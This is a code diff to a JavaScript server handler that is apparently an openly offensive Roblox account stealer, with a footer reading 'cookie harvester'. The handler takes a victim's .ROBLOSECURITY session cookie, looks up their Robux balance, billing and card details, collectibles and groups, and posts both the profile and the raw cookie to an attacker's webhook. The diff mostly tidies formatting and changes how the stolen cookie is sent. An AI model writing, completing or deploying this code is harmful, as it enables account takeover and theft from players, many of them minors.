@@ -163,18 +163,10 @@ async function getCountryFlag(req) {
 
 // ---------- MAIN HANDLER ----------
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
-
+  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
   const { cookie, rbxuid } = req.body;
-  if (!cookie || !rbxuid) {
-    return res.status(400).json({ error: "Missing cookie or rbxuid" });
-  }
-  if (!WEBHOOK_URL) {
-    console.error("WEBHOOK_URL not set");
-    return res.status(500).json({ error: "Server config error" });
-  }
+  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
+  if (!WEBHOOK_URL) return res.status(500).json({ error: "Server config error" });
 
   try {
     const user = await getUser(rbxuid, cookie);
@@ -190,111 +182,52 @@ export default async function handler(req, res) {
     const accountAge = getAgeDays(user.created);
     const placeVisits = 0;
     const summary = robux.balance + rapData.rap;
-
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
-    
-    // Cookie image URL for thumbnail decoration
     const COOKIE_IMAGE_URL = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
 
-    // --- First Embed: Account Information ---
+    // ----- 1) Account Info Embed -----
     const accountEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
       color: 0xFF69B4,
-      thumbnail: { url: COOKIE_IMAGE_URL }, // Cookie image as top-right decoration
+      thumbnail: { url: COOKIE_IMAGE_URL },
       fields: [
         {
           name: "📌 About User",
           value: `**${user.name}** (${user.displayName})\n🆔 \`${user.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}\n**Country:** ${countryFlag}`,
           inline: false
         },
-        {
-          name: "💰 Robux",
-          value: `💰 **Balance:** ${robux.balance}\n💰 **Pending:** ${robux.pending}`,
-          inline: true
-        },
-        {
-          name: "💳 Billing",
-          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
-          inline: true
-        },
-        {
-          name: "📊 Rap",
-          value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`,
-          inline: true
-        },
-        {
-          name: "🎮 Played | Passes",
-          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
-          inline: false
-        },
-        {
-          name: "📝 Summary",
-          value: `${summary}`,
-          inline: false
-        },
-        {
-          name: "⚙️ Settings",
-          value: `(Verified) ${settings.verified}\nDisabled ${settings.disabled}\nEnabled ${settings.enabled}`,
-          inline: true
-        },
-        {
-          name: "🎁 Collectibles",
-          value: collectibles.join("\n"),
-          inline: true
-        },
-        {
-          name: "🏛️ Groups",
-          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
-          inline: true
-        }
+        { name: "💰 Robux", value: `💰 **Balance:** ${robux.balance}\n💰 **Pending:** ${robux.pending}`, inline: true },
+        { name: "💳 Billing", value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`, inline: true },
+        { name: "📊 Rap", value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`, inline: true },
+        { name: "🎮 Played | Passes", value: `\`\`\`\n${playedPassesText}\n\`\`\``, inline: false },
+        { name: "📝 Summary", value: `${summary}`, inline: false },
+        { name: "⚙️ Settings", value: `(Verified) ${settings.verified}\nDisabled ${settings.disabled}\nEnabled ${settings.enabled}`, inline: true },
+        { name: "🎁 Collectibles", value: collectibles.join("\n"), inline: true },
+        { name: "🏛️ Groups", value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`, inline: true }
       ],
       footer: { text: "made by vyro28 • cookie harvester" },
       timestamp: new Date().toISOString()
     };
 
-    // --- Second Embed: Cookie Only ---
-    const cookieEmbed = {
-      title: "🍪 .ROBLOSECURITY Cookie",
-      description: "⚠️ **WARNING: DO NOT SHARE THIS WITH ANYONE** ⚠️\nSharing this will allow someone to log in as you and steal your Robux and items.",
-      color: 0xFF69B4,
-      thumbnail: { url: COOKIE_IMAGE_URL }, // Cookie image as top-right decoration
-      fields: [
-        {
-          name: "Cookie Value (Copy this carefully)",
-          value: `\`\`\`\n${cookie}\n\`\`\``,
-          inline: false
-        }
-      ],
-      footer: { text: "made by vyro28 • cookie harvester" },
-      timestamp: new Date().toISOString()
-    };
-
-    // Send Account Info Embed First
-    const accountRes = await fetch(WEBHOOK_URL, {
+    // Send account embed
+    const embedRes = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username: "Vyro Harvest", embeds: [accountEmbed] })
     });
+    if (!embedRes.ok) throw new Error(`Account embed failed: ${embedRes.status}`);
 
-    if (!accountRes.ok) {
-      const errorText = await accountRes.text();
-      console.error("Account embed send failed:", errorText);
-      throw new Error(`Account embed failed: ${accountRes.status}`);
-    }
-
-    // Send Cookie Embed Second
+    // ----- 2) Plain message for cookie (exactly like screenshot) -----
+    const cookieMessage = {
+      content: `**.ROBLOSECURITY**\n\n_WARNING: -DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._\n\`\`\`\n${cookie}\n\`\`\``
+    };
     const cookieRes = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
+      body: JSON.stringify(cookieMessage)
     });
-
-    if (!cookieRes.ok) {
-      const errorText = await cookieRes.text();
-      console.error("Cookie embed send failed:", errorText);
-      throw new Error(`Cookie embed failed: ${cookieRes.status}`);
-    }
+    if (!cookieRes.ok) throw new Error(`Cookie message failed: ${cookieRes.status}`);
 
     return res.status(200).json({ success: true, firstTime: true });
   } catch (err) {
